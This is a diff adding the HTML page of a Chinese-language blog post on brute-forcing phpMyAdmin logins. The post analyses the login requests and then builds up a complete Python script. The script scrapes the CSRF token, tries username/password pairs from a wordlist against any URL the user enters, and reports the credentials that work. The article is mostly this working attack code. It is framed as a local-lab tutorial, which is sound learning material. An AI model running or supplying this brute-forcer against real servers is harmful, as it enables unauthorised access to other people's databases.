@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>phpmyadmin爆破 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    886 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2020 , 二月 26日 星期三, 11:05 晚上</p>
+            
+            <div class="markdown-body">
+              <h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>环境：</p>
+<ul>
+<li>phpstudy2016</li>
+<li>PHP5.4.5</li>
+</ul>
+<p>对phpmyadmin进行抓包分析</p>
+<p><img src="/images/Python/phpmyadmin/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>可以看到提交的参数</p>
+<pre><code>pma_username=root&amp;pma_password=root&amp;server=1&amp;token=a40f1e11ec5dd5b0a7d3ea945ae0adfb</code></pre><p>分别是：用户，密码，服务，token</p>
+<p>查看下提交页面的源码以获取<code>token</code></p>
+<p><img src="/images/Python/phpmyadmin/2.png" srcset="/img/loading.gif" alt=""></p>
+<p><code>token</code>是可以在网页中获取到的，进行下一步提交</p>
+<p><img src="/images/Python/phpmyadmin/3.png" srcset="/img/loading.gif" alt=""></p>
+<p>利用了GET方式向<code>index.php</code>提交了<code>token</code>，继续</p>
+<p><img src="/images/Python/phpmyadmin/4.png" srcset="/img/loading.gif" alt=""></p>
+<p>GET方式向<code>navigation.php</code>提交了<code>token</code>，继续</p>
+<p><img src="/images/Python/phpmyadmin/5.png" srcset="/img/loading.gif" alt=""></p>
+<p>提交了之后，可以看到网页显示了，一个库的操作界面，到此我们就可结束了，为啥？</p>
+<p>因为，已经成功的进入到后台，我们并不需要完整的显示，<code>只需要区别于登录界面，获取关键字即可</code></p>
+<p><img src="/images/Python/phpmyadmin/6.png" srcset="/img/loading.gif" alt=""></p>
+<p>总结：</p>
+<ul>
+<li><p>POST请求提交了：<code>用户</code>，<code>密码</code>，<code>token</code></p>
+<blockquote>
+<p>该请求，完之后会有一个302的重定向</p>
+</blockquote>
+</li>
+<li><p>GET请求向<code>index.php</code>提交了token</p>
+</li>
+<li><p>GET请求向<code>navigation.php</code>提交了token</p>
+</li>
+<li><p>直接进入后台</p>
+</li>
+</ul>
+<h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><p>思路：</p>
+<ol>
+<li>向登录界面获取token</li>
+<li>POST提交账号密码和token（需要开启session）</li>
+<li>GET提交token</li>
+</ol>
+<p>写个函数获取网页的token，用re模块获取字符串</p>
+<pre><code class="python">import requests,re
+from colorama import Fore
+
+
+# 获取token
+def Get_Token(url):
+    req = requests.get(url)
+    if req.status_code == 200:
+        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)
+        return token
+    else:
+        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))
+        exit(0)</code></pre>
+<p>提交用户密码和<code>token</code>，并且接着GET</p>
+<blockquote>
+<p>Ps：由于有302跳转，所以我们使用session进行维持</p>
+</blockquote>
+<pre><code class="python">import requests,re
+from colorama import Fore
+
+
+
+# 获取token
+def Get_Token(url):
+    req = requests.get(url)
+    if req.status_code == 200:
+        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)
+        return token
+    else:
+        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))
+        exit(0)
+
+def Crack(url):
+    header = {&quot;User-Agent&quot;: &quot;Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0&quot;}
+    session = requests.session()
+    token = Get_Token(url)
+    data = {
+        &quot;pma_username&quot;: &quot;root&quot;,  # 用户
+        &quot;pma_password&quot;: &quot;root&quot;,  # 密码
+        &quot;server&quot;: &quot;1&quot;,
+        &quot;lang&quot;: &quot;zh_CN&quot;,
+        &quot;token&quot;: token  # token
+    }
+    r = session.post(url,data=data,headers=header)
+    phpmyadmin = session.get(url + &#39;navigation.php?token=&#39; + token,headers=header)
+    # print(phpmyadmin.text)
+    if &quot;主页&quot; in phpmyadmin.text:
+        print(Fore.GREEN + &quot;[+] &quot; + &quot;{0} {1}&quot;.format(&quot;root&quot;, &quot;root&quot;))
+        exit(0)
+
+if __name__ == &quot;__main__&quot;:
+    # &quot;http://127.0.0.1/phpmyadmin/&quot;
+    Crack(&quot;http://127.0.0.1/phpmyadmin/&quot;)</code></pre>
+<p><img src="/images/Python/phpmyadmin/7.png" srcset="/img/loading.gif" alt="image-20200226131710891"></p>
+<p>可以看到能直接登录到页面内了，接下来就修改下代码，就可以了进行爆破了</p>
+<pre><code class="python">import requests,re
+from colorama import Fore
+
+
+
+# 获取token
+def Get_Token(url):
+    req = requests.get(url)
+    if req.status_code == 200:
+        token = re.search(&quot;name=\&quot;token\&quot; value=\&quot;(.*?)\&quot;&quot;,req.text).group(1)
+        return token
+    else:
+        print(Fore.RED + &quot;[-]&quot; + Fore.WHITE + &quot; 访问网站失败,响应码为: {0}&quot;.format(req.status_code))
+        exit(0)
+
+def Crack(url,users):
+    header = {&quot;User-Agent&quot;: &quot;Mozilla / 5.0(Windows NT 10.0;WOW64;rv: 52.0) Gecko / 20100101Firefox / 52.0&quot;}
+    session = requests.session()
+    token = Get_Token(url)
+    for user in users:
+        for pwd in users:
+            data = {
+                &quot;pma_username&quot;: user,  # 用户
+                &quot;pma_password&quot;: pwd,  # 密码
+                &quot;server&quot;: &quot;1&quot;,
+                &quot;lang&quot;: &quot;zh_CN&quot;,
+                &quot;token&quot;: token  # token
+            }
+            print(Fore.RED + &quot;[*] &quot; + Fore.WHITE + &quot;正在进行破解：{0}   |   {1}&quot;.format(user, pwd))
+            r = session.post(url,data=data,headers=header)
+            phpmyadmin = session.get(url + &#39;navigation.php?token=&#39; + token,headers=header)
+            # print(phpmyadmin.text)
+            if &quot;主页&quot; in phpmyadmin.text:
+                print(Fore.GREEN + &quot;[+] &quot; + &quot;{0} {1}&quot;.format(user, pwd))
+                exit(0)
+    print(Fore.RED + &quot;[-] &quot; + Fore.WHITE + &quot;爆破失败，请换个字典&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    filename = input(Fore.RED + &quot;Filename &gt; &quot; + Fore.GREEN)
+    Url = input(Fore.RED + &quot;Url &gt; &quot; + Fore.GREEN)
+    user = []
+    for username in open(filename,&quot;r&quot;):
+        user.append(username.strip(&quot;\n&quot;))
+    print(Fore.GREEN + &quot;[+] 开始暴力破解phpmyadmin&quot; + Fore.WHITE)
+    # &quot;http://127.0.0.1/phpmyadmin/&quot;
+    Crack(Url+&quot;/&quot;,user)</code></pre>
+<p><img src="/images/Python/phpmyadmin/8.png" srcset="/img/loading.gif" alt="image-20200226131710891"></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Python/">Python</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Python/">Python</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/04/10/Web/%E9%9D%B6%E5%9C%BA/Me-and-My-Girlfriend-1/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>VulnHub:Me-and-My-Girlfriend-1</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2020/01/29/%E6%BC%8F%E6%B4%9E/Flask-ssti/">
+                        <span>Flask-SSTI (模板注入漏洞)</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  ');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "phpmyadmin爆破&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
